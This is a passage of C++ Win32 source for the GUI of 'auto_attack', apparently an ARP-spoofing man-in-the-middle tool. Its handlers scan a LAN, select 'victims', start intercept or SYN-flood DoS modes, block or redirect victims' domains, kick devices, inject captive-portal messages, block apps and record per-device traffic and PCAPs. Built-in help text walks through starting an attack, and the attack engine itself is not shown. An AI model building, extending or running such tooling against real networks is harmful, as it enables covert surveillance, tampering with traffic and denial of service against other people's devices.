    makeButton(page, L"Focus Device",    ID_WATCH,       314, y, 110, 30);
    makeButton(page, L"Show Track Log",  ID_SHOWTRACK,   428, y, 120, 30);
    makeButton(page, L"List Track Logs", ID_TRACKS,      552, y, 120, 30);
    makeButton(page, L"Save Report",     ID_REPORT,      676, y, 110, 30);
    makeButton(page, L"Bypass Check",    ID_BYPASS,      790, y, 110, 30);

    makeStatic(page, L"Activity (DNS / SNI / HTTP events per host)",
               8, 50, 500, 20, g_fontBold);

    g_hActivityLV = makeListView(page, ID_ACTIVITY_LV, 8, 74, 900, 240);
    const wchar_t* cols[] = {L"IP", L"Hostname", L"DNS", L"SNI", L"HTTP", L"Age", L"Events"};
    const int widths[] = {130, 220, 70, 70, 70, 80, 70};
    // setupLV also inserts the columns - do not insert them here as well
    setupLV(g_hActivityLV, cols, widths, 7);

    // ---- per-device detailed timeline --------------------------------
    makeStatic(page, L"Live timeline for selected device", 8, 322, 400, 20, g_fontBold);
    g_hTimelineCombo = makeCombo(page, ID_TIMELINE_COMBO, 8, 344, 280);
    g_hCapCheck = CreateWindowW(L"BUTTON", L"Record PCAP",
        WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX,
        296, 346, 130, 24, page, (HMENU)(INT_PTR)ID_CAP_CHECK, g_hInst, NULL);
    SendMessage(g_hCapCheck, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    SetWindowTheme(g_hCapCheck, L"DarkMode_Explorer", NULL);
    makeButton(page, L"Save Timeline", ID_TIMELINE_SAVE, 432, 342, 130, 28);
    makeButton(page, L"Open Captures", ID_CAPTURES,      570, 342, 130, 28);

    g_hTimelineEdit = makeEdit(page, 0, 8, 376, 900, 240, true);
    SendMessage(g_hTimelineEdit, EM_SETREADONLY, TRUE, 0);
    SetWindowTheme(g_hTimelineEdit, L"DarkMode_Explorer", NULL);
}

void buildControlPage(HWND page) {
    int y = 10;
    makeStatic(page, L"Block domain", 8, y + 6, 120, 22, g_fontBold);
    makeEdit(page, ID_BLOCK_DOMAIN, 130, y, 220, 26);
    makeStatic(page, L"victim (blank=*)", 360, y + 6, 120, 22);
    makeEdit(page, ID_BLOCK_VICTIM, 480, y, 140, 26);
    makeButton(page, L"Block", ID_BLOCK_BTN, 630, y - 2, 80, 30);

    y = 46;
    makeStatic(page, L"Redirect", 8, y + 6, 120, 22, g_fontBold);
    makeEdit(page, ID_REDIR_DOMAIN, 130, y, 180, 26);
    makeStatic(page, L"to IP", 320, y + 6, 40, 22);
    makeEdit(page, ID_REDIR_IP, 364, y, 120, 26);
    makeStatic(page, L"victim", 494, y + 6, 60, 22);
    makeEdit(page, ID_REDIR_VICTIM, 558, y, 100, 26);
    makeButton(page, L"Redirect", ID_REDIR_BTN, 668, y - 2, 90, 30);

    y = 82;
    makeStatic(page, L"Unblock", 8, y + 6, 120, 22, g_fontBold);
    makeEdit(page, ID_UNBLOCK_DOMAIN, 130, y, 300, 26);
    makeButton(page, L"Unblock", ID_UNBLOCK_BTN, 440, y - 2, 90, 30);

    y = 122;
    makeStatic(page, L"Rules", 8, y, 200, 22, g_fontBold);
    makeButton(page, L"Refresh",       ID_REFRESH_RULES, 130, y - 4, 90, 28);
    makeButton(page, L"Save Rules",    ID_SAVE_RULES,    230, y - 4, 100, 28);
    makeButton(page, L"Load Rules",    ID_LOAD_RULES,    340, y - 4, 100, 28);
    makeButton(page, L"Kick Selected", ID_KICK,          450, y - 4, 110, 28);
    makeButton(page, L"Unkick All",    ID_UNKICK,        570, y - 4, 100, 28);

    g_hRulesLV = makeListView(page, ID_RULES_LV, 8, 158, 880, 320);
    const wchar_t* cols[] = {L"Pattern", L"Action", L"Target", L"Victim"};
    const int widths[] = {340, 100, 160, 160};
    setupLV(g_hRulesLV, cols, widths, 4);
}

void buildMessagePage(HWND page) {
    int y = 10;
    makeStatic(page, L"Send a captive-portal notice to a victim (or *)",
               8, y, 600, 22, g_fontBold);
    y = 44;
    makeStatic(page, L"Target:", 8, y + 6, 60, 22, g_fontBold);
    g_hMsgTarget = makeEdit(page, ID_MSG_TARGET, 72, y, 160, 26);
    setEditUTF8(g_hMsgTarget, "*");
    makeStatic(page, L"(* = all devices, or type a single IP)",
               240, y + 6, 400, 22);

    y = 82;
    makeStatic(page, L"Message:", 8, y, 100, 22, g_fontBold);
    g_hMsgEdit = makeEdit(page, ID_MSG_EDIT, 8, y + 24, 880, 260, true);

    y = 380;
    makeButton(page, L"Send Message", ID_MSG_SEND, 8,   y, 140, 34);
    makeButton(page, L"Stop Message", ID_MSG_STOP, 156, y, 140, 34);

    g_hMsgNote1 = makeStatic(page,
        L"Start an attack first. The notice is served on port 80 of this machine "
        L"and appears on the victim's next DNS lookup or captive-portal probe.",
        8, y + 46, 860, 20);
    g_hMsgNote2 = makeStatic(page,
        L"HTTPS-only, DNS-over-HTTPS and IPv6-only DNS can bypass the notice. "
        L"If port 80 is busy the log names the program holding it.",
        8, y + 68, 860, 20);
}

void buildAppsPage(HWND page) {
    int y = 10;
    makeButton(page, L"Refresh",         ID_APPS_REFRESH, 8,   y, 100, 30);
    makeButton(page, L"Show Signatures", ID_APPS_SIGS,    114, y, 130, 30);
    makeButton(page, L"Block App",       ID_APPS_BLOCK,   250, y, 110, 30);
    makeButton(page, L"Unblock App",     ID_APPS_UNBLOCK, 366, y, 110, 30);

    makeStatic(page, L"Detected apps per victim", 8, 50, 400, 20, g_fontBold);
    g_hAppsLV = makeListView(page, ID_APPS_LV, 8, 74, 880, 420);
    const wchar_t* cols[] = {L"Victim", L"App", L"Status"};
    const int widths[] = {200, 200, 120};
    setupLV(g_hAppsLV, cols, widths, 3);
}

void buildPages() {
    for (int i = 0; i < 5; ++i) {
        g_pages[i] = CreateWindowExW(0, L"AA_Panel", L"",
            WS_CHILD | WS_CLIPCHILDREN | WS_CLIPSIBLINGS | (i == 0 ? WS_VISIBLE : 0),
            10, 110, 900, 500, g_hMain, NULL, g_hInst, NULL);
        SendMessage(g_pages[i], WM_SETFONT, (WPARAM)g_fontUI, TRUE);
    }
    buildSetupPage(g_pages[0]);
    buildTrackingPage(g_pages[1]);
    buildControlPage(g_pages[2]);
    buildMessagePage(g_pages[3]);
    buildAppsPage(g_pages[4]);
}

// ---------------------------------------------------------------
// panel class: STATIC containers swallow WM_COMMAND / WM_NOTIFY from
// their children (verified empirically), so pages and the header use
// this class instead — it forwards them to its parent window and
// paints/handles colors for the controls inside.
// ---------------------------------------------------------------
LRESULT CALLBACK PanelProc(HWND h, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_COMMAND:
        case WM_NOTIFY:
        case WM_HSCROLL:
        case WM_VSCROLL: {
            HWND parent = GetParent(h);
            if (parent) return SendMessageW(parent, msg, wp, lp);
            return 0;
        }
        case WM_ERASEBKGND: {
            HDC dc = (HDC)wp;
            RECT rc;
            GetClientRect(h, &rc);
            FillRect(dc, &rc, g_bgBrush);
            return 1;
        }
        case WM_CTLCOLORSTATIC: {
            HDC dc = (HDC)wp;
            HWND ctl = (HWND)lp;
            if (ctl == g_hAccent) {
                SetBkColor(dc, COL_ACCENT);
                return (LRESULT)g_accentBrush;
            }
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_BG);
            return (LRESULT)g_bgBrush;
        }
        case WM_CTLCOLOREDIT: {
            HDC dc = (HDC)wp;
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_INPUT);
            return (LRESULT)g_inputBrush;
        }
        case WM_CTLCOLORLISTBOX: {
            HDC dc = (HDC)wp;
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_INPUT);
            return (LRESULT)g_inputBrush;
        }
    }
    return DefWindowProcW(h, msg, wp, lp);
}

// ---------------------------------------------------------------
// layout
// ---------------------------------------------------------------
void layoutAll(int cx, int cy) {
    const int HEADER_H = 70;
    const int TAB_Y = 78;
    const int TAB_H = 30;
    const int STATUS_H = 44;
    const int LOG_BTNS_H = 32;

    MoveWindow(g_hHeader, 0, 0, cx, HEADER_H, TRUE);
    if (g_hAccent) MoveWindow(g_hAccent, 0, HEADER_H - 2, cx, 2, TRUE);
    // the adapter dropdown was drawn under the START button; size it to fit
    MoveWindow(g_hAdapterCombo, 360, 22, cx - 750, 220, TRUE);
    MoveWindow(g_hBtnStartHdr,   cx - 380, 18, 110, 34, TRUE);
    MoveWindow(g_hBtnStopHdr,    cx - 264, 18, 110, 34, TRUE);
    MoveWindow(g_hBtnRestoreHdr, cx - 148, 18, 130, 34, TRUE);
    MoveWindow(g_hTab, 10, TAB_Y, cx - 20, TAB_H, TRUE);

    int pageY = TAB_Y + TAB_H + 4;
    int logH = 150;
    int pageH = cy - pageY - logH - LOG_BTNS_H - STATUS_H - 30;

    for (int i = 0; i < 5; ++i)
        MoveWindow(g_pages[i], 10, pageY, cx - 20, pageH, TRUE);

    if (g_hVictimLV) {
        MoveWindow(g_hVictimLV, 8, 74, cx - 40, pageH - 220, TRUE);
        if (g_hModeLabel) MoveWindow(g_hModeLabel, 8, pageH - 82, 100, 22, TRUE);
        MoveWindow(g_hModeCombo, 110, pageH - 88, 320, 220, TRUE);
        HWND h;
        h = GetDlgItem(g_pages[0], ID_START); if (h) MoveWindow(h, 448, pageH - 92, 160, 36, TRUE);
        h = GetDlgItem(g_pages[0], ID_STOP);  if (h) MoveWindow(h, 616, pageH - 92, 160, 36, TRUE);
        if (g_hTipLabel) MoveWindow(g_hTipLabel, 8, pageH - 24, 780, 20, TRUE);
    }
    if (g_hActivityLV) {
        int actH = (pageH - 74) * 42 / 100;
        if (actH < 110) actH = 110;
        MoveWindow(g_hActivityLV, 8, 74, cx - 40, actH, TRUE);
        int ty = 74 + actH + 34;
        HWND h;
        h = GetDlgItem(g_pages[1], ID_TIMELINE_COMBO);
        if (h) MoveWindow(h, 8, ty, 280, 220, TRUE);
        if (g_hCapCheck) MoveWindow(g_hCapCheck, 296, ty + 2, 130, 24, TRUE);
        h = GetDlgItem(g_pages[1], ID_TIMELINE_SAVE);
        if (h) MoveWindow(h, 432, ty - 2, 130, 28, TRUE);
        h = GetDlgItem(g_pages[1], ID_CAPTURES);
        if (h) MoveWindow(h, 570, ty - 2, 130, 28, TRUE);
        if (g_hTimelineEdit) {
            int eh = pageH - (ty + 30) - 8;
            if (eh < 60) eh = 60;
            MoveWindow(g_hTimelineEdit, 8, ty + 30, cx - 40, eh, TRUE);
        }
    }
    if (g_hRulesLV)    MoveWindow(g_hRulesLV,    8, 158, cx - 40, pageH - 175, TRUE);
    if (g_hAppsLV)     MoveWindow(g_hAppsLV,     8, 74,  cx - 40, pageH - 90,  TRUE);
    if (g_hMsgEdit) {
        // keep the message editor, buttons and notes on-page at every size
        MoveWindow(g_hMsgEdit, 8, 106, cx - 40, pageH - 256, TRUE);
        HWND h;
        h = GetDlgItem(g_pages[3], ID_MSG_SEND);
        if (h) MoveWindow(h, 8,   pageH - 138, 140, 34, TRUE);
        h = GetDlgItem(g_pages[3], ID_MSG_STOP);
        if (h) MoveWindow(h, 156, pageH - 138, 140, 34, TRUE);
        if (g_hMsgNote1) MoveWindow(g_hMsgNote1, 8, pageH - 96, cx - 40, 20, TRUE);
        if (g_hMsgNote2) MoveWindow(g_hMsgNote2, 8, pageH - 74, cx - 40, 20, TRUE);
    }

    int logY = pageY + pageH + 4;
    MoveWindow(g_hLogEdit, 10, logY, cx - 20, logH, TRUE);

    int btnsY = logY + logH + 4;
    HWND c = GetDlgItem(g_hMain, ID_LOG_CLEAR); if (c) MoveWindow(c, 10,  btnsY, 100, 26, TRUE);
    HWND p = GetDlgItem(g_hMain, ID_LOG_COPY);  if (p) MoveWindow(p, 114, btnsY, 100, 26, TRUE);
    HWND s = GetDlgItem(g_hMain, ID_LOG_SAVE);  if (s) MoveWindow(s, 218, btnsY, 100, 26, TRUE);

    MoveWindow(g_hStatusText, 0, cy - STATUS_H, cx, STATUS_H, TRUE);
}

// ---------------------------------------------------------------
// command handlers
// ---------------------------------------------------------------
void setModeFromCombo() {
    int sel = (int)SendMessageW(g_hModeCombo, CB_GETCURSEL, 0, 0);
    int m = sel + 1;
    if (m < 1 || m > 6) m = 1;
    // warn if switching mode during an attack (never hold g_stateMutex across
    // a modal dialog: its message loop refreshes the UI and would deadlock)
    bool attacking = false;
    int curMode = 1;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        attacking = g_status.attack;
        curMode = g_status.mode;
    }
    if (attacking) {
        int r = MessageBoxW(g_hMain,
            L"An attack is currently running.\n\n"
            L"Changing the mode will send the new mode to the engine,\n"
            L"but the running attack keeps its original mode until\n"
            L"you STOP and START again.\n\n"
            L"Continue?",
            L"Mode change during attack", MB_YESNO | MB_ICONWARNING);
        if (r != IDYES) {
            // revert combo to current mode
            SendMessageW(g_hModeCombo, CB_SETCURSEL,
                         (curMode >= 1 && curMode <= 6) ? curMode - 1 : 0, 0);
            return;
        }
    }
    char buf[32];
    snprintf(buf, sizeof(buf), "m %d", m);
    sendCmd(buf);
}

void onScan()      { sendCmd("scan"); }
void onQuick()     { sendCmd("gg");   }
void onRestore()   { sendCmd("restore"); }
void onFwd()       { sendCmd("f"); }
void onNames()     { sendCmd("names"); }
void onFingerprint(){ sendCmd("fingerprint *"); appendLog("[*] fingerprinting all devices...\r\n"); }
void onSelectAll() { sendCmd("t all"); }
void onSelectNone(){ sendCmd("t none"); }
void onTop()       { sendCmd("top 10"); }
void onRefreshAct(){ sendCmd("_dump"); }
void onTracks()    { sendCmd("tracks"); }
void onSaveRules() { sendCmd("save"); }
void onLoadRules() { sendCmd("load"); }
void onUnkick()    { sendCmd("unkick"); }
void onAppsRefresh(){ sendCmd("_dump"); }
void onAppsSigs()  { sendCmd("appsigs"); }

void onStart() {
    if (g_hVictimLV && ListView_GetItemCount(g_hVictimLV) == 0) {
        MessageBoxW(g_hMain,
            L"No devices found yet.\n\n"
            L"Click \"Scan Network\" first (or \"Quick Start\", which does\n"
            L"scan + select all + intercept in one step).",
            L"auto_attack - nothing to attack", MB_OK | MB_ICONINFORMATION);
        return;
    }
    int checked = 0;
    if (g_hVictimLV) {
        int n = ListView_GetItemCount(g_hVictimLV);
        for (int i = 0; i < n; ++i)
            if (ListView_GetCheckState(g_hVictimLV, i)) checked++;
    }
    if (checked == 0) {
        int r = MessageBoxW(g_hMain,
            L"No devices are selected.\n\n"
            L"Select every device found on the network and start?",
            L"Start attack", MB_YESNO | MB_ICONQUESTION);
        if (r != IDYES) return;
        sendCmd("t all");
        Sleep(120);
    }
    // DoS safety confirmation
    int sel = (int)SendMessageW(g_hModeCombo, CB_GETCURSEL, 0, 0) + 1;
    if (sel == 6) {
        int r = MessageBoxW(g_hMain,
            L"Mode 6 (DoS) will SYN-flood the selected device(s).\n\n"
            L"This can disrupt or crash the target device.\n"
            L"Only use on devices you own.\n\n"
            L"Continue?",
            L"Confirm DoS", MB_YESNO | MB_ICONWARNING);
        if (r != IDYES) return;
    }
    setModeFromCombo();
    Sleep(50);
    appendLog("[*] starting attack\r\n");
    sendCmd("g");
}

void onHelp() {
    MessageBoxW(g_hMain,
        L"HOW TO USE - 4 steps\n\n"
        L"1. Pick your network adapter in the top-right dropdown.\n"
        L"   (Only adapters with a gateway are listed.)\n\n"
        L"2. Click \"Scan Network\". Devices appear in the list below.\n\n"
        L"3. Tick the device(s) you want to target.\n\n"
        L"4. Pick a mode (1 = Intercept is the normal one) and press\n"
        L"   START ATTACK. Watch the status bar: seen / sent must climb.\n\n"
        L"STOP & REPAIR restores the network. RESTORE ARP repairs\n"
        L"without stopping the engine.\n\n"
        L"TROUBLESHOOTING\n"
        L"- No devices? You picked the wrong adapter - rescan.\n"
        L"- No names? Optional; Resolve Names retries.\n"
        L"- Counters dead? Press START first (status must say ATTACKING).\n"
        L"- \"wpcap.dll not found\"? Install the Npcap runtime.",
        L"auto_attack - How To Use", MB_OK | MB_ICONINFORMATION);
}
void onStop() { appendLog("[*] stopping\r\n"); sendCmd("x"); }

void onShowTrack() {
    std::string ip = lvText(g_hActivityLV, 0);
    if (ip.empty()) {
        ip = promptText(g_hMain, L"Show Track Log", L"Enter victim IP:");
        if (ip.empty()) return;
    }
    std::string n = promptText(g_hMain, L"How many lines?",
                                L"Number of recent lines (default 30):");
    int lines = n.empty() ? 30 : atoi(n.c_str());
    if (lines <= 0) lines = 30;
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "showtrack %s %d", ip.c_str(), lines);
    sendCmd(cmd);
}

void onWatch() {
    std::string ip = lvText(g_hActivityLV, 0);
    if (ip.empty()) {
        ip = promptText(g_hMain, L"Focus Device", L"Enter victim IP:");
        if (ip.empty()) return;
    }
    setTimelineFocus(ip);
}

void onSaveTimeline() {
    wchar_t path[MAX_PATH];
    swprintf_s(path, L"%hs\\timeline.txt", guiDir().c_str());
    OPENFILENAMEW ofn = {sizeof(ofn)};
    ofn.hwndOwner = g_hMain;
    ofn.lpstrFilter = L"Text\0*.txt\0All\0*.*\0";
    ofn.lpstrFile = path;
    ofn.nMaxFile = MAX_PATH;
    ofn.Flags = OFN_OVERWRITEPROMPT;
    if (!GetSaveFileNameW(&ofn)) return;
    int len = GetWindowTextLengthW(g_hTimelineEdit);
    wchar_t* p = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
    if (!p) return;
    GetWindowTextW(g_hTimelineEdit, p, len + 1);
    int u8len = WideCharToMultiByte(CP_UTF8, 0, p, -1, NULL, 0, NULL, NULL);
    std::string u8(u8len > 1 ? u8len - 1 : 0, 0);
    if (u8len > 1) WideCharToMultiByte(CP_UTF8, 0, p, -1, &u8[0], u8len, NULL, NULL);
    free(p);
    HANDLE hf = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                          FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD wr = 0;
        WriteFile(hf, u8.c_str(), (DWORD)u8.size(), &wr, NULL);
        CloseHandle(hf);
    }
}

void onBypass()  { sendCmd("bypass"); }

void onReport() {
    sendCmd("report");
    appendLog("[*] writing atk\\report.html + report.json...\r\n");
    // the engine writes the files on its own thread; open them shortly after
    SetTimer(g_hMain, ID_TIMER_REPORT, 900, NULL);
}

void onOpenCaptures() {
    std::string dir = guiDir() + "atk\\captures";
    CreateDirectoryA(dir.c_str(), NULL);
    std::wstring w = toWide(dir);
    ShellExecuteW(NULL, L"open", w.c_str(), NULL, NULL, SW_SHOWNORMAL);
}

void onBlock() {
    std::string dom = getEditUTF8(GetDlgItem(g_pages[2], ID_BLOCK_DOMAIN));
    std::string who = getEditUTF8(GetDlgItem(g_pages[2], ID_BLOCK_VICTIM));
    if (dom.empty()) { MessageBoxW(g_hMain, L"Enter a domain.", L"Block", MB_OK); return; }
    if (who.empty()) who = "*";
    sendCmd("block " + dom + " " + who);
}

void onRedirect() {
    std::string dom = getEditUTF8(GetDlgItem(g_pages[2], ID_REDIR_DOMAIN));
    std::string ip  = getEditUTF8(GetDlgItem(g_pages[2], ID_REDIR_IP));
    std::string who = getEditUTF8(GetDlgItem(g_pages[2], ID_REDIR_VICTIM));
    if (dom.empty() || ip.empty()) {
        MessageBoxW(g_hMain, L"Enter domain and target IP.", L"Redirect", MB_OK);
        return;
    }
    if (who.empty()) who = "*";
    sendCmd("redirect " + dom + " " + ip + " " + who);
}

void onUnblock() {
    std::string dom = getEditUTF8(GetDlgItem(g_pages[2], ID_UNBLOCK_DOMAIN));
    if (dom.empty()) { MessageBoxW(g_hMain, L"Enter a domain.", L"Unblock", MB_OK); return; }
    sendCmd("unblock " + dom);
}

void onKick() {
    std::string ip = promptText(g_hMain, L"Kick Device", L"Enter victim IP:");
    if (ip.empty()) return;
    sendCmd("kick " + ip);
}

void onMsgSend() {
    std::string target = getEditUTF8(g_hMsgTarget);
    if (target.empty()) target = "*";
    std::string text = getEditUTF8(g_hMsgEdit);
    if (text.empty()) {
        MessageBoxW(g_hMain, L"Type a message first.", L"Send Message", MB_OK);
        return;
    }
    if (!g_status.attack) {
        int r = MessageBoxW(g_hMain,
            L"No attack is running, so the notice cannot reach the device yet.\n\n"
            L"Start the attack now and send the message?",
            L"Send Message", MB_YESNO | MB_ICONQUESTION);
        if (r != IDYES) return;
        onStart();
    }
    for (auto& ch : text) if (ch == '\n' || ch == '\r') ch = ' ';
    if (target == "*") sendCmd("msgall " + text);
    else               sendCmd("msg " + target + " " + text);
    appendLog("[*] message queued for " + target +
              " - watch the log for portal/armed status\r\n");
    PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
}

void onMsgStop() {
    std::string target = getEditUTF8(g_hMsgTarget);
    if (target.empty()) target = "*";
    sendCmd("msgstop " + target);
}

void onAppBlock() {
    std::string victim = lvText(g_hAppsLV, 0);
    std::string app    = lvText(g_hAppsLV, 1);
    if (app.empty()) {
        MessageBoxW(g_hMain, L"Select an app from the list.", L"Block App", MB_OK);
        return;
    }
    if (victim.empty()) victim = "*";
    sendCmd("blockapp " + app + " " + victim);
}

void onAppUnblock() {
    std::string app = lvText(g_hAppsLV, 1);
    if (app.empty()) {
        app = promptText(g_hMain, L"Unblock App", L"App name (tiktok, discord, ...):");
        if (app.empty()) return;
    }
    sendCmd("unblockapp " + app);
}

void showPage(int idx) {
    for (int i = 0; i < 5; ++i)
        ShowWindow(g_pages[i], i == idx ? SW_SHOW : SW_HIDE);
}

// keyboard shortcuts must work no matter which control has focus; the main
// window only sees WM_KEYDOWN when it is focused itself, so the message loop
// also routes keys here (see wWinMain)
bool handleGlobalKey(WPARAM vk) {
    if (vk == VK_F5) { onScan(); return true; }
    HWND f = GetFocus();
    wchar_t cls[32] = {0};
    if (f) GetClassNameW(f, cls, 32);
    if (wcscmp(cls, L"Edit") == 0) return false;   // never steal typing
    if (vk == VK_ESCAPE) { onStop(); return true; }
    if (vk == VK_RETURN) {
        // only on the Setup tab, and only from the page/list background: Enter
        // on a focused button must still press that button
        bool onList = (wcscmp(cls, L"SysListView32") == 0);
        bool onPage = (wcscmp(cls, L"AA_Main") == 0 || wcscmp(cls, L"AA_Panel") == 0);
        if ((onList || onPage) && g_hTab && TabCtrl_GetCurSel(g_hTab) == 0) {
            onStart();
            return true;
        }
    }
    return false;
}

// ---------------------------------------------------------------
// window proc
// ---------------------------------------------------------------
LRESULT CALLBACK MainProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE:
            g_hMain = hWnd;
            break;

        case WM_ERASEBKGND: {
            HDC dc = (HDC)wp;
            RECT rc;
            GetClientRect(hWnd, &rc);
            FillRect(dc, &rc, g_bgBrush);
            return 1;
        }

        case WM_CTLCOLORSTATIC: {
            HDC dc = (HDC)wp;
            HWND ctl = (HWND)lp;
            if (ctl == g_hStatusText) {
                COLORREF tc = COL_DIM;
                if (g_status.attack) tc = COL_GREEN;
                else if (g_status.scanning) tc = COL_ACCENT;
                else if (g_status.victims == 0) tc = COL_ORANGE;
                else tc = COL_ACCENT;
                SetTextColor(dc, tc);
                SetBkColor(dc, COL_PANEL);
                return (LRESULT)g_panelBrush;
            }
            for (int i = 0; i < 5; ++i)
                if (ctl == g_pages[i]) {
                    SetBkColor(dc, COL_BG);
                    return (LRESULT)g_bgBrush;
                }
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_BG);
            return (LRESULT)g_bgBrush;
        }

        case WM_CTLCOLOREDIT: {
            HDC dc = (HDC)wp;
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_INPUT);
            return (LRESULT)g_inputBrush;
        }

        case WM_COMMAND: {
            int id = LOWORD(wp);
            switch (id) {
                case ID_ADAPTER_COMBO:
                    if (HIWORD(wp) == CBN_SELCHANGE) {
                        int idx = (int)SendMessageW(g_hAdapterCombo, CB_GETCURSEL, 0, 0);
                        if (idx >= 0) {
                            g_adapterIndex = idx + 1;
                            g_adapterGuid = (idx < (int)g_adapterGuids.size())
                                            ? g_adapterGuids[idx] : std::string();
                            if (idx < (int)g_adapterNames.size())
                                saveAdapter(g_adapterNames[idx], g_adapterGuid);
                            int r = MessageBoxW(hWnd,
                                L"Adapter changed.\n\n"
                                L"Restart the engine to apply it? Any running attack is\n"
                                L"stopped and ARP is repaired first.",
                                L"Adapter", MB_YESNO | MB_ICONQUESTION);
                            if (r == IDYES) {
                                startChild();
                                SetTimer(g_hMain, ID_TIMER_AUTOSCAN, 1500, NULL);
                            }
                        }
                    }
                    break;
                case ID_HELP:         onHelp();      break;
                case ID_HDR_START:    onStart();     break;
                case ID_HDR_STOP:     onStop();      break;
                case ID_HDR_RESTORE:  onRestore();   break;
                case ID_SCAN:         onScan();      break;
                case ID_FILTER:
                    if (HIWORD(wp) == EN_CHANGE) {
                        g_filterText = lowerStr(getEditUTF8(g_hFilterEdit));
                        refreshVictimsLV(g_hVictimLV);
                    }
                    break;
                case ID_QUICK:        onQuick();     break;
                case ID_NAMES:        onNames();     break;
                case ID_FINGERPRINT:  onFingerprint(); break;
                case ID_NAMES2:       onNames();     break;
                case ID_SELECT_ALL:   onSelectAll(); break;
                case ID_SELECT_NONE:  onSelectNone();break;
                case ID_FWD:          onFwd();       break;
                case ID_START:        onStart();     break;
                case ID_STOP:         onStop();      break;
                case ID_RESTORE:      onRestore();   break;
                case ID_MODE_COMBO:
                    if (HIWORD(wp) == CBN_SELCHANGE) setModeFromCombo();
                    break;
                case ID_REFRESH_ACT:  onRefreshAct();break;
                case ID_TOP:          onTop();       break;
                case ID_SHOWTRACK:    onShowTrack(); break;
                case ID_TRACKS:       onTracks();    break;
                case ID_REPORT:       onReport();    break;
                case ID_BYPASS:       onBypass();    break;
                case ID_WATCH:        onWatch();     break;
                case ID_TIMELINE_COMBO:
                    if (HIWORD(wp) == CBN_SELCHANGE && !g_updatingTimelineCombo) {
                        int idx = (int)SendMessageW(g_hTimelineCombo, CB_GETCURSEL, 0, 0);
                        if (idx >= 0 && idx < (int)g_comboIps.size())
                            setTimelineFocus(g_comboIps[idx]);
                    }
                    break;
                case ID_CAP_CHECK:
                    if (HIWORD(wp) == BN_CLICKED) {
                        bool on = SendMessageW(g_hCapCheck, BM_GETCHECK, 0, 0) == BST_CHECKED;
                        sendCmd(on ? "pcap on" : "pcap off");
                        appendLog(on ? "[*] recording per-device PCAP\r\n"
                                   : "[*] PCAP recording stopped\r\n");
                        PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
                    }
                    break;
                case ID_TIMELINE_SAVE: onSaveTimeline(); break;
                case ID_CAPTURES:     onOpenCaptures();  break;
                case ID_BLOCK_BTN:    onBlock();     break;
                case ID_REDIR_BTN:    onRedirect();  break;
                case ID_UNBLOCK_BTN:  onUnblock();   break;
                case ID_REFRESH_RULES:sendCmd("_dump"); break;
                case ID_SAVE_RULES:   onSaveRules(); break;
                case ID_LOAD_RULES:   onLoadRules(); break;
                case ID_KICK:         onKick();      break;
                case ID_UNKICK:       onUnkick();    break;
                case ID_MSG_SEND:     onMsgSend();   break;
                case ID_MSG_STOP:     onMsgStop();   break;
                case ID_APPS_REFRESH: onAppsRefresh();break;
                case ID_APPS_SIGS:    onAppsSigs();  break;
                case ID_APPS_BLOCK:   onAppBlock();  break;
                case ID_APPS_UNBLOCK: onAppUnblock();break;
                case ID_LOG_CLEAR:    clearLog();    break;
                case ID_LOG_COPY:     copyLog();     break;
                case ID_LOG_SAVE:     saveLog();     break;
            }
            return 0;
        }

        case WM_NOTIFY: {
            LPNMHDR hdr = (LPNMHDR)lp;
            if (hdr->idFrom == ID_TAB && hdr->code == TCN_SELCHANGE) {
                showPage(TabCtrl_GetCurSel(g_hTab));
                return 0;
            }
            if (hdr->idFrom == ID_VICTIM_LV && hdr->code == LVN_ITEMCHANGED) {
                if (g_updatingVictimsLV) return 0;
                NMLISTVIEW* pnm = (NMLISTVIEW*)lp;
                if ((pnm->uChanged & LVIF_STATE) &&
                    ((pnm->uOldState ^ pnm->uNewState) & LVIS_STATEIMAGEMASK)) {
                    std::string csv;
                    int total = ListView_GetItemCount(g_hVictimLV);
                    // read the IP out of the row itself: g_victims can be
                    // replaced by a new dump between a refresh and this click,
                    // and an index would then select the wrong device
                    for (int i = 0; i < total; ++i) {
                        if (!ListView_GetCheckState(g_hVictimLV, i)) continue;
                        wchar_t wip[64] = {0};
                        ListView_GetItemText(g_hVictimLV, i, 1, wip, 64);
                        char ip[64] = {0};
                        WideCharToMultiByte(CP_UTF8, 0, wip, -1, ip, 64, NULL, NULL);
                        if (!ip[0]) continue;
                        if (!csv.empty()) csv += ",";
                        csv += ip;
                    }
                    if (csv.empty()) sendCmd("t none");
                    else             sendCmd("_select " + csv);
                }
                return 0;
            }
            if (hdr->idFrom == ID_VICTIM_LV && hdr->code == LVN_COLUMNCLICK) {
                NMLISTVIEW* pnm = (NMLISTVIEW*)lp;
                if (g_victimSortCol == pnm->iSubItem) g_victimSortAsc = !g_victimSortAsc;
                else { g_victimSortCol = pnm->iSubItem; g_victimSortAsc = true; }
                setSortIndicator(g_hVictimLV, g_victimSortCol, g_victimSortAsc);
                refreshVictimsLV(g_hVictimLV);
                return 0;
            }
            if (hdr->idFrom == ID_ACTIVITY_LV && hdr->code == LVN_COLUMNCLICK) {
                NMLISTVIEW* pnm = (NMLISTVIEW*)lp;
                if (g_activitySortCol == pnm->iSubItem) g_activitySortAsc = !g_activitySortAsc;
                else { g_activitySortCol = pnm->iSubItem; g_activitySortAsc = true; }
                setSortIndicator(g_hActivityLV, g_activitySortCol, g_activitySortAsc);
                refreshActivityLV(g_hActivityLV);
                return 0;
            }
            if (hdr->idFrom == ID_VICTIM_LV && hdr->code == NM_DBLCLK) {
                NMLISTVIEW* pnm = (NMLISTVIEW*)lp;
                if (pnm->iItem >= 0) {
                    wchar_t wip[64] = {0};
